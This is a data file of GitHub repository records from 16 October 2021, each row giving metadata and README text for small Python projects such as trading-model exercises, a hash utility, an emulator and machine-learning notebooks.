417846251;projeto-daytrade;https://github.com/dkiago/projeto-daytrade;;2021-10-16T14:07:58Z;0;0;0;projeto-daytrade Projeto que visa a validação de um modelo de Árvore de Decisão em Python. 
417790031;Windows95;https://github.com/CallMeKitsu/Windows95;Python;2021-10-16T10:10:34Z;0;0;0;
417808185;rename-29_;https://github.com/Davestriker77/rename-29_;Python;2021-10-16T11:31:27Z;0;0;0;rename-29_ This one click python removes 29_ found in some videos leaving the original name. 
417847409;Projeto-Day-Trade;https://github.com/LucasTARosa/Projeto-Day-Trade;;2021-10-16T14:12:01Z;0;0;0;Projeto Day Trade Projeto desenvolvido durante a dinâmica do curso da DNC 
417846242;Projeto-Day-Trade;https://github.com/hmjesus/Projeto-Day-Trade;Jupyter Notebook;2021-10-16T14:07:56Z;0;0;0;
417846206;Projeto-Day-Trade;https://github.com/TarcisioPhilips/Projeto-Day-Trade;Jupyter Notebook;2021-10-16T14:07:50Z;0;0;0;Projeto-Day-Trade Projeto que visa a validação de um modelo de Árvore de Decisão em python Estrutura de um projeto para o meu repositório de projetos - Data Science Feito utilizando python! 
417781208;SVM_Machine_Learning;https://github.com/sudo-riyad/SVM_Machine_Learning;Python;2021-10-16T09:35:14Z;0;0;0;SVM_Machine_Learning It is a Python based machine learning project wtih SVM classifier. 
417860574;web_app_postgresql;https://github.com/crivmar/web_app_postgresql;SCSS;2021-10-16T14:58:37Z;0;0;0;web_app_postgresql Ejemplo de una aplicación python para extraer una información de un servidor de postgresql 
417862500;logis;https://github.com/rmaniego/logis;;2021-10-16T15:05:27Z;0;0;0;logis Just a sandbox to simulate CLC, SLC, FSM, Datapaths, etc. using Python. 
417853869;Chatbot-using-nltk;https://github.com/neelesh-23/Chatbot-using-nltk;;2021-10-16T14:33:32Z;0;0;0;
417826140;SiteGuide-Internship-Assignment;https://github.com/J-S-Jayasree/SiteGuide-Internship-Assignment;Python;2021-10-16T12:47:16Z;0;0;0;
417831475;face-regonition-and-ball-tracking-module;https://github.com/ahmed-abd-el-fattah/face-regonition-and-ball-tracking-module;Python;2021-10-16T13:08:46Z;0;0;0;face-regonition-and-ball-tracking-module this is a python code to detect a tennis ball and also has a fceregonition code. 
417782568;readjson-getpdbid;https://github.com/singhnitink/readjson-getpdbid;Python;2021-10-16T09:41:05Z;0;0;0;readjson-getpdbid Use this python script to fetch PDB-IDs from JSON file 
417862289;signinpdf;https://github.com/CBTAS/signinpdf;Python;2021-10-16T15:04:43Z;0;0;0;"signinpdf Inserir assinatura (imagem: png ou jpg) em PDF por meio do PYTHON.   Sintaxe do comando:    signinpdf('nomedoarquivo.pdf', 'img-assinatura.png', [""Numero de paginas= int"", ""Posicao X= int"", ""Posicao Y= int"", ""Altura da Imagem= int"", ""Largura da Imagem= list[]""])  Lista de argumentos: 'nomedoarquivo.pdf' =  Informar o nome do arquivo do qual será utilizado para a inserção da imagem da assinatura; 'img-assinatura.png' = Informar o nome do arquivo da imagem da assinatura que pode estar em : png ou jpg;  Argumento dentro de colchetes: [a, b, c, d, e]   a. Informar o número de páginas do documento, podendo ser apenas uma página ou o tatal. O valor deve ser número inteiro; b. Informar a posicao X, com origem a partir do lado esquerdo inferior. O valor deve ser número inteiro; c. Informar a posicao Y, com origem a partir do lado esquerdo inferior. O valor deve ser número inteiro; d. Informar a altura da imagem. O valor deve ser um inteiro;  e. Informar a largura da imagem. O valor deve ser um inteiro.      Exemplo:  signinpdf(arquivo.pdf, img.png, [10, 300, 100, 150, 50])  Baseado nas informações:   Do projeto SIGN_PDF - Assinatura em PDF do Git do MARTINRUENZ;   Do BLOG do Patrick Mazulo. (http://blog.dunderlabs.com/inserindo-informacoes-em-pdfs-editaveis.html)  PyPDF2: https://pythonhosted.org/PyPDF2/  "
417846221;Projeto-Day6-DataExpert;https://github.com/rvprieto/Projeto-Day6-DataExpert;Jupyter Notebook;2021-10-16T14:07:53Z;0;0;0;Projeto-Day6-DataExpert Projeto para validação de um modelo de árvore de decisão em python 
417816754;AssignmentAssistant;https://github.com/ankurdivekar/AssignmentAssistant;Python;2021-10-16T12:07:50Z;0;0;0;AssignmentAssistant A tool built for automatic checking of assignments given out during a Python course 
417779918;rock-paper-scissors-game-;https://github.com/namelessrandom1/rock-paper-scissors-game-;;2021-10-16T09:30:05Z;0;0;0;
417846287;Projeto-Day-Trade;https://github.com/GuilhermeSMRodriguez/Projeto-Day-Trade;;2021-10-16T14:08:03Z;0;0;0;Projeto-Day-Trade Projeto que visa a validação de um modelo de árvore de Decisão em python 
417867588;usemod-to-markdown;https://github.com/dwmuller/usemod-to-markdown;Python;2021-10-16T15:24:11Z;0;0;0;UseMod to Markdown convertor A script to convert the pages of a UseMod wiki database to a set of Markdown files. The approach is somewhat inspired by a Python script by rajbot, but written from scratch. This script is useful only if you have access to the UseMod wiki's data directory. The main use case for it is to convert a UseMod wiki to one of the current crop of static site content managers (static SCM). You will almost certainly need to tweak the script to adapt it both to your wiki's usage patterns and your SCM's conventions. No attempt is made to preserve historical edits. UseMod was designed to keep only the most recent few edits of a page anyway. 
417820013;Bitcoin-Price-or-Direction-Predictor;https://github.com/omar-abdel-fattah/Bitcoin-Price-or-Direction-Predictor;Python;2021-10-16T12:21:56Z;0;0;0;Bitcoin-Price-or-Direction-Predictor this is a python Script that predicts the price of Bitcoin using Machine learning the program uses 2 methods of ML and uses pandas to preprocess the CSV file containg the historical data of the stock some identifiers are also added to the data to make it easy for the model to predict the price 
417851235;Generalized-Collatz-Conjecture;https://github.com/strdst1/Generalized-Collatz-Conjecture;Python;2021-10-16T14:24:38Z;0;0;0;Generalized-Collatz-Conjecture A Python Script to generate number sequences using the Collatz conjecture as its basis. The Algorithm is as follows: Given a positive integer x, perform a * x + b where a, b are also positive odd integers, perform x/2 if x is even. Do this for every new a*x+b generated until a number gets repeated. The Program also plots these hailstone numbers on a graph using Matplotlib. Different graphs for different branches seem to show that each sequence returns a finite cycle and a finite numbe of cycles. 
417865460;hashtools;https://github.com/tilas0/hashtools;Python;2021-10-16T15:16:09Z;0;0;0;HashTools A simple python application that allows you to use hashes easily with hashlib.  Contents  Why? Requirements Installation Features To-Do License  Why?  I made this application to give me an easy way to use hashes. I hadn't planned on releasing this to GitHub so please forgive some bad code. Requirements  To use this program you will require python 3.9 or higher Installation  Install with git $ git clone https://github.com/tilas0/hashtools.git $ cd hashtools $ python3 main.py  Features   Supports multiple hashing methods (MD5, SHA256, SHA1) Cross-platform support Simple CLI Compare file hashes Validate any file hash Hash any file Hash any string  To-Do   Command-line arguments Clean up code  License  Licensed under the MIT License 
417772436;Online-Book-Store-Using-Flask;https://github.com/lauvindra/Online-Book-Store-Using-Flask;;2021-10-16T08:57:45Z;0;0;0;Online-Book-Store-Using-Flask  1.Introduction Web Frameworks are the foundation of web development.There are two types of framework which are full-stack frameworks and microframeworks (sometimes called non-full-stack).Choosing a full-stack framework, you will have a variety of tools and packages at hand to develop any kind of application. Those are MVC architecture,ORM(object-relational mapping),routers,templating engine,security,and more. Full-stack frameworks are sizeable because they contain several modules, components and services. A micro framework, on the other hand, fits into a single code source file.As such, it’s used whenever minimum coding is required like small applications and REST-based apps. You can also use clone this project to download all the required plugins and datasets: git clone https://github.com/lauvindra/Online-Book-Store-Using-Flask.git 2. Objective  To create a book store web application using a microframeworks To enable the web application to Create,Read,Update,Delete Use Object-relational mapping(ORM) for converting data between incompatible type systems using object-oriented programming technique.  3. Flask   Flask is a microframework, which means it is more focused on simplicity and less on functions. Microframeworks lack functionality but they can be extended with databases and templating engines. It is a lightweight modular framework and can be adapted to a variety of tasks.It has a number of useful features, such as an integrated development server and a quick debugger, Jinja2 template engine, support for secure cookies, the ability to connect any ORM. Jinja2 template engine is a text-based template language and thus can be used to generate any markup as well as source code.  3. SQLAlchemy   SQLAlchemy is the Python SQL toolkit and Object Relational Mapper that gives application developers the full power and flexibility of SQL. Instead of hiding away SQL and object relational details behind a wall of automation, SQLAlchemy's overall approaches all processes are fully exposed within a series of composable, transparent tools. A relationally-oriented query system, exposing the full range of SQL's capabilities explicitly, including joins, subqueries, correlation, and most everything else, in terms of the object mode  4.Online Book Store These are the implementation of Flask together with a database using Flask SQLAlchemy. Main Page  Add Books  Update and Delete Books  5. References  https://flask.palletsprojects.com/en/2.0.x/ https://ncube.com/blog/top-python-web-frameworks-2020 https://www.sqlalchemy.org/  
417845994;Report_Genrater;https://github.com/Nitesh065/Report_Genrater;;2021-10-16T14:07:01Z;0;0;0;Report_Genrater A simple python project to convert the csv data in pdf with some visulizations 1.In this Project we will use pandas and MatPlotLib libraries to convert the csv file into a pdf, with some visulizations like barchart or piechart 2.For csv file we will use Kaggel.com, this website provides data with help of community 3.Will deploy this project with help of nginx 4.Will use Flask/Fast Api for server 
417846224;urban-disco;https://github.com/BillyImperial/urban-disco;;2021-10-16T14:07:53Z;0;0;0;urban-disco Projeto que visa validação de um modelo de Árvore de Decisão em python 
417837759;Sign-Language-Translator-ASL-;https://github.com/Mohamedyasserhelmy/Sign-Language-Translator-ASL-;;2021-10-16T13:33:48Z;0;0;1;Sign-Language-Translator-ASL- A Desktop Python Application that translates American Sign Language (ASL) to English words. test from sub-master 
417841172;pyhton-clock;https://github.com/CaidnAnimates/pyhton-clock;Python;2021-10-16T13:47:57Z;0;0;0;
417846226;Projeto-Day-Trade;https://github.com/LucasAlbieroPellucci/Projeto-Day-Trade;Jupyter Notebook;2021-10-16T14:07:54Z;0;0;0;Projeto-Day-Trade Projeto que visa a validação de modelo de Árvore de Decisão em python 
417820857;Attendance-Grabber-Project;https://github.com/omar-abdel-fattah/Attendance-Grabber-Project;Python;2021-10-16T12:25:41Z;0;0;0;Attendance-Grabber-Project this project uses python to be able to monitor the attendance of employees using face recognition Each employee is given unique user name and password and scans his picture in the signup the data of each employee is saved in database (excel) so that it is not deleted each runtime when the user scans for attence his face tells his name and the time of attendace is saved in the excel file employees can be added and removed at run time which means the system is dynamic 
417789582;TaBest;https://github.com/Bug-Duck/TaBest;Python;2021-10-16T10:08:48Z;0;0;0;TaBest 一个类似于Excel的表格软件,使用python 
417874935;AI-Age-and-Gender-detector;https://github.com/WanderingMind3/AI-Age-and-Gender-detector;Python;2021-10-16T15:52:39Z;0;0;0;
417779310;GSCEventMOD;https://github.com/anindya2001/GSCEventMOD;;2021-10-16T09:27:28Z;1;1;0;GSCEventMOD  Python implementation for 'Moving Object Detection for Event-based Vision using Graph Spectral Clustering', ICCV Workshops 2021 Abstract: https://openaccess.thecvf.com/content/ICCV2021W/GSP-CV/html/Mondal_Moving_Object_Detection_for_Event-Based_Vision_Using_Graph_Spectral_Clustering_ICCVW_2021_paper.html Paper: https://openaccess.thecvf.com/content/ICCV2021W/GSP-CV/papers/Mondal_Moving_Object_Detection_for_Event-Based_Vision_Using_Graph_Spectral_Clustering_ICCVW_2021_paper.pdf Corresponding authors: Anindya Mondal (anindyam.jan@gmail.com) and Shashant R. (shashant7699@gmail.com) Please cite this paper if you find our work helpful: @InProceedings{Mondal_2021_ICCV, author    = {Mondal, Anindya and R, Shashant and Giraldo, Jhony H. and Bouwmans, Thierry and Chowdhury, Ananda S.}, title     = {Moving Object Detection for Event-Based Vision Using Graph Spectral Clustering}, booktitle = {Proceedings of the IEEE/CVF International Conference on Computer Vision (ICCV) Workshops}, month     = {October}, year      = {2021}, pages     = {876-884} } 
417854972;AlgorithmsUN2021I;https://github.com/pgrisales/AlgorithmsUN2021I;Jupyter Notebook;2021-10-16T14:37:47Z;0;0;0;
417792904;Arxiv2Kindle;https://github.com/soumik12345/Arxiv2Kindle;Python;2021-10-16T10:23:44Z;2;2;1;Arxiv2Kindle Arxiv2Kindle is a simple script written in python that converts LaTeX source downloaded from Arxiv and recompiles it to better fit a reading device (such as a Kindle). Features  Arxiv2Kindle can render images, diagrams, tables and formulae. It also converts 2-column formats into a single column for ease of reading. Arxiv2Kindle can mail the converted pdf file to your kindle (if you have a wifi-enabled Kindle).  Note:  Arxiv2Kindle does not work on papers without the source. The fixed transformations applied on the source may not lead to a desired result in a few cases. Still, on most cases the results are readable.  Useage Install the dependencies using pip install -r requirements.txt, preferrably inside a virtual environment. Arxiv2Kindle can be used via a CLI: Usage: arxiv2kindle.py [OPTIONS]  Options:   -u, --arxiv_url TEXT    Arxiv URL   -w, --width INTEGER     Width   -h, --height INTEGER    Height   -m, --margin FLOAT      Margin   -l, --is_landscape      Flag: Is output landscape   -g, --gmail TEXT        Your Gmail ID   -k, --kindle_mail TEXT  Your Kindle ID   --help  Converted Samples Note: All photoes have been captured on a Kindle Paperwhite 10th Generation.           
417848856;PoemGenerator;https://github.com/deeplearningunb/PoemGenerator;;2021-10-16T14:16:51Z;0;0;0;PoemGenerator Repositório focado no trabalho de Tópicos Especiais de Engenharia de Software - Deep Learning 
417778160;chip8-py;https://github.com/tomszir/chip8-py;Python;2021-10-16T09:22:23Z;0;0;0;chip8-py A Chip8 interpreter created in Python.  CHIP-8 is an interpreted programming language, developed by Joseph Weisbecker. It was initially used on the COSMAC VIP and Telmac 1800 8-bit microcomputers in the mid-1970s.  Table of Contents  Motivation Screenshots Installation Usage ROMs Keyboard Layout Reference License  Motivation The main motivation for this project was to learn the basics of emulation and lower-level programming concepts. Screenshots  roms/TETRIS    roms/PONG   Installation  Assumes you already have Python 3.9.5  git clone https://github.com/tomszir/chip8-py.git cd chip8-py pip install -r reqs.txt Usage py main.py --rom roms/PONG ROMs  A pack of simple yet amusing games, in the public domain, for any Chip-8 Interpreter. They are: 15 Puzzle, Blinky, Blitz, Brix, Connect 4, Guess, Hidden, Invaders, Kaleid, Maze, Merun, Missle, Pong, Pong 2, Puzzle, Syzgy, Tank, Tetris, TicTac, UFO, Vbrix and Wipeoff.  All roms were taken from Chip-8 Public Domain ROMs Keyboard Layout            1 2 3 4   Q W E R   A S D F   Z X C V     F1 - Change the color scheme F2 - Reload the current ROM  Reference  Chip8 Wikipedia Cowgod's Chip-8 Technical Reference, made by Thomas P. Greene Guide to making a CHIP-8 emulator, made by Tobias V. Langhoff  License This project is under the MIT license 
417870636;star-pattern;https://github.com/piyush054/star-pattern;Python;2021-10-16T15:35:46Z;0;0;0;star-pattern I'm a beginner and staring coding with python it's my first project as star pattern 
417812139;Zoom-Unlimited-Link;https://github.com/Sriram247/Zoom-Unlimited-Link;Python;2021-10-16T11:48:47Z;1;1;0;Zoom-Unlimited-Link This python program runs selenium library to control your browser and create an unlimited zoom meet link without your help... It automates the process of signing up a zoom account verifying the email and entering the user/pass details. IT IS STRONGLY ADVISED TO NOT TOUCH YOUR COMPUTER DURING THE AUTOMATION as The program controls your keyboard to enter some details. This program only works if you have python installed https://www.python.org/downloads/ run get-pip.py to install pip. run install.py to install the required libraries (Selenium, Pyautogui) Finally, run main.py to Execute the program in Chrome. Or run main-edge.py to Execute the program in Microsoft Edge. 
417800683;SmartMouse;https://github.com/Lyrain02/SmartMouse;C++;2021-10-16T10:59:50Z;0;0;0;SmartMouse This is the class project for Innovation Practice. Its a simple implementation of a smartmouse built by Arduino and python. Arduino is used in the implementation of the smartmouse, and python is used to realize bluetooth communicaition and GUI control. For this project, you can use the smart mouse to control the cursor on the screen of computer. Besides, you can use it to control the movement of the drawing car built by Arduino Uno. why smartmouse? Tranditional mouse need a smooth and solid surface. But sometimes, when you want to use your computer and mouse on a sofa, it may be difficult for you to use the mouse, because the sofa is so soft and sometimes rough. Then you may need a smart mouse which can be used in the air, so that you can get rid of the dependence on the solid surface. Maybe sounds a little silly, but that's the originl intention why I conduct this project. This smart mouse is designed for non-solid surface, which means you can use it in the air. Implementation Hardware Smart Mouse  Arduino Nano, adxl345, hc-06 module, 3 button, 1 led, 1 resistence, wires and power. Drawing Car  Arduino Uno, Uno expansion board, L298N motor drive, 2 motors, 3D printing car materials, wires and power. In fact, the car is not designed by myself, and I just bought the materials online and assembled the car. This car is only used to show the control of the smart mouse. It's not the core of the design but an application. Software Python is so powerful that I use serial to realize Bluetooth communication between mouse and computer, and pyautogui to control the cursor movement of a computer screen. 
417868487;COCO-Viewer-Application;https://github.com/ngzhili/COCO-Viewer-Application;;2021-10-16T15:27:43Z;0;0;0;COCO Viewer Application A python Tkinter GUI Application to view and compare coco annotations and raw images on your local machine easily. Currently only support Windows. Computer Vision application to enable viewing of annotations on coco dataset and compare them to raw images. Supports segementation and bounding box classes. Description Two Main Functionalities:  Create a masks of bounding box and segmentation object classes on your image dataset (supports only .jpg, .jpeg, .png, .JPG, .JPEG , .PNG image file types) with annotations in coco.json format. Downloads these annotated images in the same input image file type to selected inbuilt folder or specified local directory. Image Viewer to view your downloaded masked images in a new window.  Visuals Main Page for application:  Image Viewer Interface on new window:   Installation Note: No external library packages needed to be installed. Steps  Download and install coco viewer application folder on your local machine. Extract all files in .zip. Double click on coco_viewer.exe application. Application should being launching.  Usage Use examples liberally, and show the expected output if you can. It's helpful to have inline the smallest example of usage that you can demonstrate, while providing links to more sophisticated examples if they are too long to reasonably include in the README. Support Please report an issue if you encounter any. Roadmap Planning to support Mac Users in the future. Contributing Open to Contributions. Authors and acknowledgment  pycocotools API was used and modified for this application  License  Project status Ongoing. 
417819029;Vacation_Search_Challenge;https://github.com/jj2773/Vacation_Search_Challenge;Jupyter Notebook;2021-10-16T12:17:19Z;0;0;0;Vacation_Search_Challenge Module 6 Challenge using Python and APIs to search for vacation spots by allowing users to input temperature ranges.  Once the temperature ranges are selected a map is generated where four cities can be selected to travel between.  A directions map with weather information is made from the four cities selected. Approach Weather Database Random GPS coordinates are generated and citipy returns a nearest city.  This city is then passed to the OpenWeather API which returns weather conditions. Vacation Search By limiting cities according to the users desirable temperature ranges, a subset for vacation planning is offered. Vacation Itinerary After allowing the user to select a start, stop, and three waypoints, gmaps is leveraged with Google's API to generate directions maps. 
417803615;Using_Ranking_Loss_Functions_to_Prune_Tree_Based_Machine_Learning_Algorithms;https://github.com/bradklassen/Using_Ranking_Loss_Functions_to_Prune_Tree_Based_Machine_Learning_Algorithms;;2021-10-16T11:11:33Z;0;0;0;Using Ranking Loss Functions to Prune Tree Based Machine Learning Algorithms Most common decision tree programming packages use a mean squared error (MSE) loss function. However, MSE may not always be optimal, especially for a ranking problem. Some problems may benefit from custom loss functions. Is a ranking loss function optimal for a ranking problem? By building decision tree and AdaBoost models from scratch, it is possible to customize the pruning loss function used in the models. A simulation study found that Average Precision at k outperformed MSE for the decision tree model. While, MSE outperformed Average Precision at k for the AdaBoost model. Finally, the models were applied to professional golf data where the results aligned with the simulation study. 
417814045;dnd_npc_stat_calc;https://github.com/rosemadr/dnd_npc_stat_calc;;2021-10-16T11:57:16Z;0;0;0;dnd_npc_stat_calc Python project to create stat blocks for combat scenarios in DnD based on variable PC levels and party numbers. 
417824560;Face-Recognition-and-ball-Tracking;https://github.com/omar-abdel-fattah/Face-Recognition-and-ball-Tracking;Python;2021-10-16T12:40:54Z;0;0;0;Face-Recognition-and-ball-Tracking This a python Script for Face recognition and Tennis ball Tracking modules in a Tennis Robot Collector the project consists of 3 parts : Face recognition to allow only the known user to start the robot Ball tracking to know where exactly a bll hits the ground and whether the ball is inside or outaide the court An integration between both of these modules(in Rasbperry PI ) with the low level controller that controls motors ,sensors and etc A ball detection Vision module 
417835821;image-similarity;https://github.com/MehdiOfficial/image-similarity;Python;2021-10-16T13:25:56Z;0;0;0;image-similarity A Python console application that calculates the similarity rate between 3 images. Using both, OpenCV and Matplotlib libraries. 
417864040;TProject;https://github.com/ThijsieJWW/TProject;Python;2021-10-16T15:11:03Z;0;0;0;"TProject Project manager by Thijs TProject is a package manager that can be used in the command-line. it is supported by every platform python can run on.  Getting started Installation For the installation is python needed, on Linux and Macos it is already installed however on Windows you have to install it first. The recommended python version: Python 3.9. There are more modules required to run TProject, see requirements.txt Linux/MacOs (X) Open up terminal at the installation location and type: python3 setup.py install. If there are no errors shown and python is on path, you can check if it works by typing: cd .. and then TProject. Windows 10 Open up Command Prompt in the installation location and type: python setup.py install. If there are no errors shown and python is on path, you can check if it works by typing: cd .. and then TProject.  Issues If you have any problems with TProject you can report it on GitHub Issues  Projects This is a quick walk through TProject. You can make a new project by opening the cmd or terminal and typing: TProject new HelloWorld. HelloWorld is the name of the project, don't make names using spaces or ""-"" this is for importing the project like python does.  Project Structure This is the default project structure. All the settings are editable in Project.toml   . ├── Bin - Here are the compiled files │   ├── example.out │   └── example.pyc ├── Logs - Here are the build and run logs │   ├── build.log │   └── run.log ├── Src - Here is all the source code │   └── example.py ├── Project.toml     - All the settings ├── setup.py         - To install globally on your device ├── requirements.txt - pip freeze format └── Structure.toml   - All the files your project needs for release   "
417815827;punju;https://github.com/datadlog/punju;;2021-10-16T12:04:28Z;0;0;0;Punju Import data from a variety of sources into a database. 
417782644;matplotlib-gantt;https://github.com/gkkeys/matplotlib-gantt;Jupyter Notebook;2021-10-16T09:41:21Z;1;1;0;Gantt Chart Generator based on Matplotlib 基于Matplotlib实现的甘特图生成器。可以用于绘制操作系统的进程调度图。 Chart of Process Scheduling of Operating System  Usage You can import this respository into Colab or Jupyter Nootbook and work on ProcessGantt.ipynb. 
417822674;GAuthy;https://github.com/syedibrahim/GAuthy;Python;2021-10-16T12:33:04Z;0;0;0;GAuthy Cli based Google Authenticator TOTP Generator Prerequisites  Requires Python 3.6+ Install requirements from requirements.txt  pip install -r requirements.txt  3.Install zbar package pip install zbar  For mac user brew install zbar  How to ###Usage: python gauthy [--key/-k Authenticator_Key|--qr/-q Path_To_Qr_Image] [--current/-c]  To generate TOTP using Authenticator Key python gauthy -k YOURAUTHKEYHERE python gauthy --key YOURAUTHKEYHERE   To generate TOTP using Authenticator QR code Image python gauthy -q path/to/image python gauthy --qr path/to/image  Other options  To display just current TOTP   Use -c / --curent flag to display just current TOTP Example:  python gauthy -q path/to/image --current python gauthy --key YOURAUTHKEYHERE -c   For help  python gauthy --help  
417849828;reminder_notification_app;https://github.com/rajatgarg765/reminder_notification_app;Python;2021-10-16T14:19:55Z;0;0;0;"reminder_notification_app This app is made using python and it is useful if you have a lot of work for the day and you want to schedule things on time. IN THE MESSAGE BOX ""YOU CAN WRITE YOUR WHOLE DAY WORK"" HAPPY CODING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! "
417828523;autoscanVT;https://github.com/m1r3x/autoscanVT;Python;2021-10-16T12:57:05Z;0;0;0;autoscanVT Automatically scan a txt or pdf file for IP addresses and domain names, and check maliciousness via VirusTotal Setup:   Install prerequisites: pip3 install -r requirements.txt   Add your own VirusTotal API keys to the script   Run: python3 scan.py   
417799283;quake2_server_launcher;https://github.com/neofright/quake2_server_launcher;Python;2021-10-16T10:54:11Z;0;0;0;quake2_server_launcher A simple Python script to scrape active multiplayer servers and add them to config.cfg before launching Yamagi Quake II on Linux. 
417837873;Credit_Risk_Analysis;https://github.com/jpmendeziii/Credit_Risk_Analysis;Jupyter Notebook;2021-10-16T13:34:18Z;1;1;0;Credit_Risk_Analysis Overview The purpose of this analysis is to create a supervised machine learning model that could accurately predict credit risk. Six different methods were utilized.    Naive Random Oversampling     SMOTE Oversampling     Cluster Centroid Undersampling     SMOTEENN Sampling     Balanced Random Forest Classifying     Easy Ensemble Classifying    Through each of these methods, the data was split into training and testing datasets. Accuracy scores, confusion matrices and classification reports were compiled in summary form. Deliverable 1 Use Resampling Models to Predict Credit Risk  Random Oversampling  Accuracy Score: 67.4%   SMOTE Oversampling  Accuracy Score: 68.2%  Deliverable 2 Use the SMOTEENN algorithm to Predict Credit Risk  Undersampling Analysis  Accuracy Score: 52.2%   SMOTEENN Analysis  Accuracy Score: 68.1%  Deliverable 3 Use Ensemble Classifiers to Predict Credit Risk  Random Forest Analysis  Accuracy Score: 64.8%   Easy Ensemble Analysis  Accuracy Score: 92.3%  Summary This analysis tries to find the best model that can detect if a loan is high-risk. Because of that, we need to find a model that lets the least amount of high-risk loans pass through undetected. That correlating statistic for this is the recall rate for high-risk. Looking through the different models, the ones that scored the highest were:  Easy Ensemble Analysis (91%) SMOTEENN Analysis (76%) SMOTE Oversampling (70%)  While this is the most important statistic that is pulled from this analysis, another important statistic is recall rate for low-risk as it shows how many low-risk loans are flagged as high-risk. Looking through the different models, the ones that scored the highest were:  Random Forest Analysis (100%) Easy Ensemble Analysis (94%)  However, one looks at the accuracy score to get a picture of how well the model performs in general. The models with the highest accuracy scores were:  Easy Ensemble Analysis (92.3%) SMOTE Oversampling (68.2%) SMOTEENN Analysis (68.1%)  Therefore the model that is recommended by factoring multiple metrics is the Easy Ensemble Analysis. 
417840602;Come_Rain_or_Shine;https://github.com/britavb/Come_Rain_or_Shine;Jupyter Notebook;2021-10-16T13:45:35Z;0;0;0;Come_Rain_or_Shine A project for working with time series data in Python. This project uses historical weather data from Hannover, Lower Saxony, Germany Data Sources: https://www.dwd.de/DE/leistungen/klimadatendeutschland/klarchivtagmonat.html https://npgeo-corona-npgeo-de.hub.arcgis.com 
417818352;WordCounter;https://github.com/Priyangshu-Mandal/WordCounter;CSS;2021-10-16T12:14:16Z;0;0;0;
417873390;KEY3IYAL;https://github.com/Iheb-Aouini/KEY3IYAL;Python;2021-10-16T15:46:39Z;0;0;0;
417870209;Regex-Checker;https://github.com/codeslacker1155/Regex-Checker;Python;2021-10-16T15:34:12Z;0;0;0;Regex-Checker Regex-Checker is a simple python script I wrote for my college programming class to show my professor I understand regular expressions on a low-level. Description This is a simple program that shows how to use regular expressions in a basic way to parse through two list and provide output to the user on what password was considered the safest due to the presence of symbols in the password list. (ex. '@%^$*') The program is a static command line program that shows the user in a visual fashion what password in the list 'passwords' has symbols in it and what email that password belongs to based on the index. The list are meant to be the same len(). Getting Started Dependencies  no prerequisites, just the 're' module or pythons builtin regular expressions module.  Installing  No real install needed  Executing program  Run the program like any other common python script.  python checker.py  Help Common problems or issues are that you are not using an authorized user and need to switch to root. sudo python checker.py  Authors Contributors names and contact info Christopher Hyatt (me)  @codeslacker1155  Version History  0.2  Various bug fixes and optimizations See commit change or See release history   0.1  Initial Release    License This project is licensed under the [NAME HERE] License - see the LICENSE.md file for details Acknowledgments Inspiration taken from in-class lab for my 'Intermediate Programming' class at Coastal Carolina University. 
417875952;Sudoku-solver-GUI;https://github.com/Karandeep-Singhh/Sudoku-solver-GUI;Python;2021-10-16T15:56:53Z;0;0;0;Sudoku-solver-GUI A sudoku game in python which you can play and also see a demonstration of Backtracking as the algorithms solves the game. Key points  Make sure you have pygame installed. Make sure both files above are in same directory.  Run the gui-sudoku.py file to play. 
417786373;Applied-Gaussian-blur-filter-on-Webcam;https://github.com/inamdarmusab/Applied-Gaussian-blur-filter-on-Webcam;;2021-10-16T09:56:56Z;0;0;0;Applied-Gaussian-blur-filter-on-Webcam this project I have made in a python program, I applied the Gaussian Blur filter on web cam.  This is inspired by daily observation on Televison eg. In news channels some accident case is shown then they hide or blured some part of it like this type of observation I done and make that project. Technology Used Python Programming language 
417834833;Housing-Price-Prediction;https://github.com/Csengupta1101/Housing-Price-Prediction;Jupyter Notebook;2021-10-16T13:21:34Z;0;0;0;"House Price Prediction Analysis Machine Learning Model Development About - This Project here deals with a fictional real estate company called ""Dragon Real Estates"". They are struggling in terms of predicting the prices of the houses in a specific area they want to expand in. Hence they require an accurate predictive analysis so that their buying decisions doesn't turn out unreasonable. Understanding the requirement - As Machine learning engineers our first job is to understand the requirements properly. Exploring the business objectives . Getting an idea of what resources available and sharing what additional resources might be required for the project. These meeting are to be conducted along with stakeholders of the company. We also need to understand that what kind of solution is currently being implemented to address this issue. Understanding the Dataset - The Dataset shared with us need to be analysed in-depth to provide an acurate model. currently the data set we have consist of the following details - 1. Title: Boston Housing Data 2. Sources: (a) Origin:  This dataset was taken from the StatLib library which is maintained at Carnegie Mellon University. (b) Creator:  Harrison, D. and Rubinfeld, D.L. 'Hedonic prices and the demand for clean air', J. Environ. Economics & Management, vol.5, 81-102, 1978. (c) Date: July 7, 1993 3. Past Usage:  Used in Belsley, Kuh & Welsch, 'Regression diagnostics ...', Wiley, 1980 N.B. Various transformations are used in the table on pages 244-261. -  Quinlan,R. (1993). Combining Instance-Based and Model-Based Learning. In Proceedings on the Tenth International Conference of Machine Learning, 236-243, University of Massachusetts, Amherst. Morgan Kaufmann.  4. Relevant Information: Concerns housing values in suburbs of Boston. 5. Number of Instances: 506 6. Number of Attributes: 13 continuous attributes (including ""class"" attribute ""MEDV""), 1 binary-valued attribute. 7. Attribute Information: 1. CRIM      per capita crime rate by town 2. ZN        proportion of residential land zoned for lots over               25,000 sq.ft. 3. INDUS     proportion of non-retail business acres per town 4. CHAS      Charles River dummy variable (= 1 if tract bounds               river; 0 otherwise) 5. NOX       nitric oxides concentration (parts per 10 million) 6. RM        average number of rooms per dwelling 7. AGE       proportion of owner-occupied units built prior to 1940 8. DIS       weighted distances to five Boston employment centres 9. RAD       index of accessibility to radial highways 10. TAX      full-value property-tax rate per $10,000 11. PTRATIO  pupil-teacher ratio by town 12. B        1000(Bk - 0.63)^2 where Bk is the proportion of blacks               by town 13. LSTAT    % lower status of the population 14. MEDV     Median value of owner-occupied homes in $1000's  Model Selection - After understanding the dataset completely , we need to select a few models that we want to use to train our data on. In here our target variable is ' MEDV '  which is the house prices and it's a continious variable. So initially we'll use Linear Regression for training and later on , to improve accuracy we'll check if decision tree or random forest works better with our data. This model will be a supervised learning as we have labels of the data with us. As in this dataset we have data that is already present with us and no live streaming data "
417818141;bitcoin-predicter;https://github.com/ahmed-abd-el-fattah/bitcoin-predicter;Python;2021-10-16T12:13:23Z;0;0;0;bitcoin-predicter I used a python machine learning code to try to predict the coming bitcoin price using the data from international website. This is used to help beginners trade in the stock 
417871411;MySQLFunctions;https://github.com/NickSingerer/MySQLFunctions;Python;2021-10-16T15:38:43Z;0;0;0;
